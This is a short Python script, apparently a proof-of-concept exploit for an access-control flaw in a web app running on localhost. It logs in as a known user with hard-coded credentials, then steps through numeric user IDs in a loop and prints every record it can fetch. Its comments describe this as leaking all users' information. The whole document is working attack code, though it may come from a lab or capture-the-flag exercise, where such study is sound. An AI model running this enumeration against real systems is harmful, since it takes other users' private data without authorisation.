import requests

HOST = "http://localhost:8888"

# known user
username = "steve"
password = "password"

s = requests.Session()

# Login as normal user
s.post(HOST + "/login", data={"username": username,
       "password": password}, allow_redirects=False)

# Leak all users information
i = 0
resp = s.get(HOST + f"/{i}")
while resp.status_code == 200:
  print(f"Leak user with id: {i}")
  print(resp.text)
  print()
  i += 1
  resp = s.get(HOST + f"/{i}")
